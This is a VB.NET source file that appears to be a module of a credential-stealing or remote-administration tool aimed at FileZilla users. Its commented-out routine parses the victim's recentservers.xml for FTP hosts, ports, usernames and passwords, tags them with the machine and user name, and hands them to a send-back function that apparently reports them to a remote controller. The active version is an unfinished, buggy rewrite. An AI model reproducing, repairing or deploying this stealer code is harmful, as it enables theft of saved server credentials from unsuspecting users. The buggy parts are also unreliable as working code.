Imports Microsoft.VisualBasic
Imports System.IO


'''
''' 
''' 
''' READ...
''' 
''' 
''' This is not fished, it was working fine before Leu went and broke it.
''' 
''' 
''' 

Module FileZilla
    Dim ActualLog As Boolean = False
    Dim FullLog As String = ""
    Dim NewLog As String = ""

    'Sub FileZillaRec()
    '    ActualLog = False
    '    FullLog = ""
    '    Try
    '        If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\FileZilla\recentservers.xml") Then
    '            Dim lel As String = My.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\FileZilla\recentservers.xml")
    '            Dim splitlel() As String = Split(lel, vbNewLine)
    '            Dim i As Integer = 0
    '            Dim LogCount As Integer = 0
    '            For i = 0 To splitlel.Length - 1
    '
    '                ActualLog = True
    '
    '                If splitlel(i).Contains("<Host>") Then
    '                    ActualLog = True
    '                    NewLog += Environment.MachineName & "/" & Environment.UserName & "|" & splitlel(i).Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "")
    '                Else
    '                    ActualLog = False
    '                End If
    '
    '                If splitlel(i).Contains("<Port>") Then
    '                    ActualLog = True
    '                    NewLog += ":" & splitlel(i).Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "")
    '                Else
    '                    ActualLog = False
    '                End If
    '
    '                If splitlel(i).Contains("<User>") Then
    '                    ActualLog = True
    '                    NewLog += "|" & splitlel(i).Replace("<User>", "").Replace("</User>", "").Replace("            ", "")
    '                Else
    '                    ActualLog = False
    '                End If
    '
    '                If splitlel(i).Contains("<Pass>") Then
    '                    If ActualLog = True Then
    '                        ActualLog = True
    '                        NewLog += "|" & splitlel(i).Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") & "|" & LogCount & "|[FileZilla]" & vbNewLine
    '                        LogCount += 1
    '                    End If
    '                Else
    '                    If ActualLog = True Then
    '                        NewLog += "|No Password Saved|" & LogCount & "|[FileZilla]" & vbNewLine
    '                        LogCount += 1
    '                    End If
    '                End If
    '
    '
    '        If Not NewLog = "" Then
    '            FullLog += NewLog
    '            NewLog = ""
    '        Else
    '            NewLog = ""
    '            ActualLog = True
    '        End If
    '
    '
    '            Next
    '            SendBack()
    '        End If
    '    Catch ex As Exception
    '        LoggingHost.LogClientException(ex, "Leu")
    '    End Try
    'End Sub

    Sub FileZillaRec()

        Try
            If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\FileZilla\recentservers.xml") Then

                Dim Lines As New List(Of String)
                Dim FileContents As String = My.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\FileZilla\recentservers.xml").Replace(" ", "")
                Dim Reader As New StringReader(FileContents)

                Dim NewFileContents As String = ""

                While Not Reader.Peek() = -1

                    If Reader.ReadLine() = "</Server>" Then
                        NewFileContents += Reader.ReadLine() & vbNewLine
                    Else
                        NewFileContents += Reader.ReadLine()
                    End If

                    MsgBox(NewFileContents)

                End While

                Dim DataReader As New StringReader(NewFileContents)

                While Not Reader.Peek() = -1
                    MsgBox(Reader.ReadLine())
                End While

            End If
        Catch ex As Exception
            LoggingHost.LogClientException(ex, "")
        End Try

    End Sub

    Sub SendBack()

        Try
            Dim splitlel() As String = Split(FullLog, vbNewLine)

            Dim i As Integer = 0
            For i = 0 To splitlel.Length - 1
                If Not splitlel(i) = "" Then
                    SendMiscCommandRecover(splitlel(i))
                End If
            Next
        Catch ex As Exception
            LoggingHost.LogClientException(ex, "Leu")
        End Try

    End Sub
End Module
